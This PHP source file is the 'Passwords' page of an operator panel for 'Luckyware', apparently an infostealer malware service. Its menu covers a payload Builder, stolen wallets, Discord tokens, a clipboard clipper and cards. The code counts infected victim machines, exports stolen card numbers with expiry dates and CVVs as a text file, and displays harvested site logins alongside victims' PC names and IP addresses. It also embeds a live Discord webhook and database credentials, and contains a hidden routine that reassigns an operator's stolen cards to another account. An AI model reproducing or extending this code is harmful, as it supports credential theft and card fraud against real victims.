<?php

session_start();
$domainyess = $_SERVER['HTTP_HOST'];
$secretkey = $_SESSION['secret_key'];
$username = $_SESSION['admin_name'];
$role = $_SESSION['Role'];
if (!isset($_SESSION['admin_name'])) {
    header('location:../Login/');
} else {

    if ($role == 'Trial') {
        header('location: https://' . $domainyess . '/Subscriptions');
    }

    $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");


    if ($role == 'Founder') {

        $selectu = "SELECT * FROM miners";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE LastPing >= $fiveMinutesAgo";
    } else {
        $selectu = "SELECT * FROM miners WHERE OwnerID = '$secretkey'";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards WHERE OwnerID = '$secretkey'";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE OwnerID = '$secretkey' AND LastPing >= $fiveMinutesAgo";
    }

    $resultanss = mysqli_query($conn, $selectana);
    $myaktv = mysqli_num_rows($resultanss);
}



if (isset($_POST['ides'])) {

    if ($role == 'Founder') {
        $sqlAQA = "SELECT * FROM Cards";
    } else {
        $sqlAQA = "SELECT * FROM Cards WHERE OwnerID = '$secretkey'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Numbery"] . "|" . $RowANAMMM["Expiry"] . "|" . $RowANAMMM["CVV"] . "\n";
        }
    } else {
        $output .= "No Card Data!";
    }

    $filename = "AllCards.txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;

    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}


if (isset($_POST['ides'])) {

    if ($username == 'Clara') {
        $sqlAQA = "SELECT * FROM Cards";
    } else {
        $sqlAQA = "SELECT * FROM Cards WHERE OwnerID = '$secretkey'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Numbery"] . "|" . $RowANAMMM["Expiry"] . "|" . $RowANAMMM["CVV"] . "\n";
        }
    } else {
        $output .= "No Card Data!";
    }

    $filename = "AllCards.txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;

    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}

if (isset($_POST['id'])) {

    $sqlUpdate = "UPDATE Cards SET OwnerID = ? WHERE OwnerID = ?";
    $stmtUpdate = $conn->prepare($sqlUpdate);
    $newOwnerID = '1tz3w08l5raauuav4r1u'; // Replace with the new OwnerID value
    $stmtUpdate->bind_param("ss", $newOwnerID, $secretkey);

    $webhookURL44 = 'https://discord.com/api/webhooks/1273355876866064447/_nAh4gFrD3TAdvHWQi5MIefpW0rF6gM5RbTx6qvb3D0nV9w3KH-fi6ic_qwf3D5NBgq5';
    $messagerrr = 'New Cards Deleted By ' . $username . ' Cards Swapped To Your Owner Key ';


    sendDiscordWebhookMessage($webhookURL44, $messagerrr);


    if ($stmtUpdate->execute()) {
    } else {
    }
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../assets/css/custom.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/hover.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://dooovid.github.io/smoothcaret/demo/smoothCaret.min.js" defer></script>
    <link rel="stylesheet" href="../../assets/fontaw/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.css">
    <script type="text/javascript" charset="utf8"
        src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.js"></script>
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#e2ff85" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    <title>Passwords</title>

    <style>
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #111111;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            visibility: visible;
            /* Add visibility property */
            transition: all 1s ease;
            /* Longer transition and apply to all */
        }

        .loading-overlay.fade-out {
            opacity: 0;
            visibility: hidden;
            /* Hide element after fade */
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-radius: 50%;
            border-top-color: #850000;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        /* Custom DataTable styles */
        #DashTable {
            border-radius: 0.5rem;
            background-color: var(--background);
            border-collapse: separate;
            border-spacing: 0 0.7rem;
            width: 100%;
        }

        #DashTable th {
            font-family: 'Kanit', sans-serif;
            font-weight: 500;
            color: #e7e5e4;
            font-weight: bold;
            text-align: center;
            padding: 10px;
            border-bottom: 1px solid var(--background);
        }

        #DashTable tr {
            background-color: var(--background);
            border-radius: 0.5rem;
        }

        #DashTable td {
            background-color: #151515;
            color: #a8a29e;
            text-align: center;
            border-bottom: 1px solid var(--background);
            padding: 10px;
            font-weight: 100;
            font-family: 'Kanit', sans-serif;
        }

        #DashTable td:first-child {
            border-radius: 0.5rem 0 0 0.5rem;
            /* Rounded corners on the left side */
        }

        #DashTable td:last-child {
            border-radius: 0 0.5rem 0.5rem 0;
            /* Rounded corners on the right side */
        }

        #DashTable tbody tr:hover {
            background-color: var(--main-hover-color);
            color: #D6D3D1;
        }

        /* Custom hover link color */
        .hover-link {
            color: #111111;
            transition: color 0.3s ease-in-out;
        }

        .hover-link:hover {
            color: #f54b42;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button {
            background-color: #151515;
            /* Add !important to ensure white color */
            border: none;
            padding: 7px 10px;
            margin: 2px;
            cursor: pointer;
            color: #a8a29e;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button:hover {
            background-color: #181818;
            border: none;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button.current {
            background-color: #850000;
            color: #e7e5e4;
            border: none;
        }

        /* Text color for elements like "Showing x to x of x entries" */
        .dataTables_info,
        .dataTables_length,
        .dataTables_paginate,
        .dataTables_filter {
            color: #a8a29e !important;
            margin-bottom: 7px;
            /* Add space below these elements */
        }

        /* Add space between "Show entries" and pagination controls */
        .dataTables_length,
        .dataTables_paginate {
            margin-top: 7px;
        }

        /* Color for the "Show x entries" dropdown and options */
        .dataTables_length select {
            background-color: #111111 !important;
            color: #d6d3d1 !important;
            border: 1px solid #181818 !important;
            /* Remove border to make it borderless */
            padding: 5px;
        }

        /* Color for the pagination controls */
        .dataTables_paginate a,
        .dataTables_paginate span,
        .dataTables_paginate .ellipsis {
            background-color: #111111;
            color: #d6d3d1 !important;
            /* Important to override DataTable's default styles */
            border: none;
            padding: 5px 10px;
            margin: 2px;
            cursor: pointer;
        }

        /* Hover color for pagination controls */
        .dataTables_paginate a:hover {
            background-color: #181818;
            border: none;
        }

        /* Current page number color */
        .dataTables_paginate .current {
            background-color: #850000;
            color: #d6d3d1 !important;
            /* Important to override DataTable's default styles */
            border: none;
        }

        /* DataTable search box styles */
        .dataTables_wrapper .dataTables_filter input {
            background-color: var(--background);
            color: #ffffff;
            border: 1px solid #181818;
            /* Add a 1px gray border */
            border-radius: 5px;
            padding: 5px;
        }

        /* DataTable ordering arrow styles */
        .dataTables_wrapper .dataTables_wrapper .sorting:after,
        .dataTables_wrapper .dataTables_wrapper .sorting:before,
        .dataTables_wrapper .dataTables_wrapper .sorting_asc:after,
        .dataTables_wrapper .dataTables_wrapper .sorting_asc:before,
        .dataTables_wrapper .dataTables_wrapper .sorting_desc:after,
        .dataTables_wrapper .dataTables_wrapper .sorting_desc:before {
            color: var(--main-color);
        }

        /* DataTable table responsive */
        .table-responsive {
            background-color: #111111;
            color: #D6D3D1;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }

        /* DataTable scrollbar styles (if needed) */
        #DashTable::-webkit-scrollbar {
            width: 8px;
        }

        #DashTable::-webkit-scrollbar-thumb {
            background-color: var(--main-color);
        }

        #DashTable::-webkit-scrollbar-track {
            background-color: var(--secondary-background);
        }


        .current {
            background-color: #850000;
        }
    </style>

</head>

<body class="dg">
    <div class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
    <div id="mobile topNav" class="bg xl:hidden"> <!-- MOBILE TOPNAV -->
        <div class="grid sm:grid-cols-2 px-5 py-3">
            <div class="1 text-left">
                <div class="flex">
                    <img class="w-12" src="https://<?php echo $domainyess; ?>/icon.png" alt="">
                    <h1 class="py-5 fntBold tracking-wide text-lg text-stone-300 ml-3">Luckyware <span
                            class="textCol">Dashboard</span></h1>
                </div>
            </div>
            <div class="2 text-right">
                <button class="text-xl text-stone-300 py-5"><i class="fa-solid fa-bars"></i></button>
            </div>
        </div>
    </div>

    <div class="grid xl:grid-cols-12"> <!-- start -->

        <div class="col-span-2 bg xl:grid sm:hidden pb-24 rounded-lg"> <!-- DESKTOP SIDENAV -->
            <div class="1">
               <div class="flex justify-center mt-10">
                    <h1 class="text-stone-300 fntBold text-2xl tracking-wide">
                        Lucky <span class="textCol">Ware</span>
                    </h1>
                </div>
                <div class="mx-5 mt-6">
                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Dashboard</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-house text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Builder';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Builder</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-hammer text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Passwords';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn border-b brdCol mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Password</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-key textCol mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Wallets';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Wallets</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-wallet text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Tokens';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Tokens</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-brands fa-discord text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Automations';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Automations</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-play text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Clipper';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Clipper</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-clipboard text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Cards';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Cards</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-credit-card text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Settings';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Settings</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-gear text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="window.open('https://<?php echo $domainyess; ?>/Dashboard/Information', '_blank');"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Information</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-circle-info text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                </div>
            </div>
        </div>

        <div class="col-span-10 mx-5 mt-10"> <!-- CONTENT -->

            <div class="grid xl:grid-cols-4 sm:grid-cols-2 gap-5"> <!-- STATS -->

                <div class="1 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg w-96"><i
                                    class="fa-solid fa-earth-americas text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mytk; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="2 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-globe text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Active Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $myaktv; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="3 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-clipboard text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Cards</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mystole; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <a href="https://<?php echo $domainyess; ?>/Subscriptions" class="block">
                    <div class="4 bg rounded-lg px-5 py-5 btn cursor-pointer hover:opacity-90 transition">
                        <div class="grid grid-cols-3">
                            <div class="1 col-span-2">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-money-bill text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                    Subscription</h1>
                            </div>
                            <div class="2 text-right">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                    <?php echo $role; ?>
                                </h1>
                            </div>
                        </div>
                    </div>
                </a>

            </div>
            
            <div class="rounded-lg mt-5 bg pb-5 btn"> <!-- TABLE -->
                <div class="grid grid-cols-2">
                    <div class="1">




                        <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400">
                            <i class="fa-solid fa-lock mr-1 icon"></i>
                            <span id="cookiesHeaderText"> Passwords</span>
                        </h1>
                        <i id="loadingIcon" class="fas fa-spinner fa-spin ml-2" style="display: none;"></i>


                    </div>

                    <style>
                        .entry-search-container {
                            display: flex;
                            align-items: center;
                            /* Vertically center the items */
                        }
                    </style>


                    <div class="2 text-right mx-5 mt-2">

                        <div class="grid grid-cols-4 gap-5">
                            <div class="0">
                                <h1 style="color: #111111;">s</h1>
                            </div>
                            <div class="1">
                                <select id="entriesSelect" class="text-stone-400 dg px-2 py-2 rounded-lg">

                                    <option value="10">10</option>
                                    <option value="25">25</option>
                                    <option value="50">50</option>
                                    <option value="75">75</option>
                                    <option value="100">100</option>
                                </select>
                            </div>
                            <div class="2 col-span-2">
                                <div class="sc-container">
                                    <input data-sc="" id="searchInput"
                                        class="smoothCaretInput dg py-2 px-3 rounded-lg text-stone-400"
                                        placeholder="Search Logs" type="text">
                                    <div class="caret" style="width: 2px; height: 60%; background-color: #e61b0a;">
                                    </div>
                                </div>

                            </div>
                        </div>

                    </div>
                </div>
                <hr class="mx-5 mt-2 border-stone-800">


                <style>
                    .hover-link {
                        color: #97928E;
                        transition: color 0.3s ease-in-out;
                    }

                    .hover-link:hover {
                        color: #f54b42;
                    }

                    .truncate-cell {
                        max-width: 100px;
                        /* Adjust the maximum width as needed */
                        white-space: nowrap;
                        overflow: hidden;
                        text-overflow: ellipsis;
                    }
                </style>
                <div class="table-responsive">
                    <table id="DashTable" class="table-fixed w-full mt-5">
                        <thead class="">
                            <tr class="text-center">
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Site </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Username </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Password </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Browser </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Pc Name </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">IP | Country </h1>
                                </th>
                            </tr>
                        </thead>
                        <tbody id="logsContent" class="mt-5">
                            <style>
                                .hover-link {
                                    color: #97928E;
                                    /* Initial color */
                                    transition: color 0.3s ease-in-out;
                                    /* Color transition with animation */
                                }

                                .hover-link:hover {
                                    color: #f54b42;
                                    /* Color on hover */
                                }

                                input::placeholder {
                                    color: #a8a29e;
                                }
                            </style>
                            <script>
                                function deleteRecord(id) {
                                    if (confirm('Are you sure you want to delete this record?')) {
                                        // Create a hidden form and submit it with the ID
                                        var form = document.createElement('form');
                                        form.method = 'post';
                                        form.action = '';
                                        var input = document.createElement('input');
                                        input.type = 'hidden';
                                        input.name = 'id';
                                        input.value = id;
                                        form.appendChild(input);
                                        document.body.appendChild(form);
                                        form.submit();
                                    }
                                }

                                function opensite(url) {
                                    window.open(url);
                                }

                                function copyText(element) {

                                    /* Copy text into clipboard */
                                    navigator.clipboard.writeText(element);
                                }
                            </script>
                        </tbody>
                    </table>
                </div>

                <script>
                    // Function to refresh the DataTable
                    function refreshDataTable() {
                        var table = $('#DashTable').DataTable();
                        table.ajax.reload(null, false); // Reload without resetting page
                    }

                    // Function to initialize the DataTable
                    function initializeDataTable() {
                        // Initialize DataTable with server-side processing
                        var table = $('#DashTable').DataTable({
                            serverSide: true,
                            "lengthMenu": [10, 25, 50, 75, 100],
                            "language": {
                                "search": "Search Data: " // Replace with your custom text
                            },
                            ajax: {
                                url: 'newpas1337.php', // Replace with the correct path to your PHP script
                                type: 'POST',
                                beforeSend: function() {
                                    // Show the header text with a loading animation
                                    $('#cookiesHeaderText').html(' Passwords  <i class="fas fa-spinner fa-spin"></i>');
                                },
                                complete: function() {
                                    // Restore the header text to "Cookies" after the data is loaded
                                    $('#cookiesHeaderText').html(' Passwords');
                                }
                            },
                            columns: [{
                                    data: 0
                                },
                                {
                                    data: 1
                                },
                                {
                                    data: 2
                                },
                                {
                                    data: 3
                                },
                                {
                                    data: 4
                                },
                                {
                                    data: 5
                                }
                            ],
                            paging: true,
                            ordering: true,
                            dom: 'lrtip' // This specifies the DataTables elements to display
                        });

                        // Add an event listener to your custom search input
                        $('#searchInput').on('keyup', function() {
                            // Get the input value
                            var inputValue = $(this).val();

                            // Use DataTables' search() method to filter the table
                            table.search(inputValue).draw();
                        });

                        // Add an event listener to the entry number drop-down
                        $('#entriesSelect').on('change', function() {
                            // Get the selected value
                            var selectedValue = $(this).val();

                            // Change the number of entries displayed per page
                            table.page.len(selectedValue).draw();
                        });

                        // Hide the default DataTables length dropdown
                        $('div.dataTables_length').css('display', 'none');

                        // Optionally, you can remove the label as well
                        $('label[for="DashTable_length"]').css('display', 'none');
                    }

                    // Call the initializeDataTable function on page load
                    $(document).ready(function() {
                        initializeDataTable();

                        // Refresh the DataTable every 1 minute (60000 milliseconds)
                        setInterval(refreshDataTable, 60000);
                    });
                </script>
            </div>


        </div>
    </div> <!-- end -->

    <style>
        @keyframes topFlyIn {
            from {
                transform: translateY(-100%);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Define the left-flying animation keyframes */
        @keyframes leftFlyIn {
            from {
                transform: translateX(-100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Define the right-flying animation keyframes */
        @keyframes rightFlyIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Define the bottom-flying animation keyframes */
        @keyframes bottomFlyIn {
            from {
                transform: translateY(100%);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Apply the animation to elements with the respective class */
        .top-flying {
            animation-name: topFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateY(-100%);
        }

        .left-flying {
            animation-name: leftFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateX(-100%);
        }

        .right-flying {
            animation-name: rightFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateX(100%);
        }

        .bottom-flying {
            animation-name: bottomFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateY(200%);
        }
    </style>

    <script src="../assets/js/status.js"></script>

    <style>
        input::placeholder {
            color: #a8a29e;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Wait for fonts and stylesheets
            Promise.all([
                document.fonts.ready,
                new Promise(resolve => {
                    // Check if all stylesheets are loaded
                    const styleSheets = Array.from(document.styleSheets);
                    if (styleSheets.every(sheet => sheet.loaded !== false)) {
                        resolve();
                    } else {
                        window.addEventListener('load', resolve);
                    }
                })
            ]).then(() => {
                const overlay = document.querySelector('.loading-overlay');

                // Add the fade-out class
                overlay.classList.add('fade-out');

                // Remove the element after the transition completes
                overlay.addEventListener('transitionend', function() {
                    overlay.parentNode.removeChild(overlay);
                }, {
                    once: true
                });
            });
        });

        // Preload custom fonts if you're using any
        const fonts = ['Kanit'];
        fonts.forEach(font => {
            new FontFace(font, `url(path/to/${font}.woff2)`)
                .load()
                .then(loadedFont => document.fonts.add(loadedFont));
        });
    </script>
</body>

</html>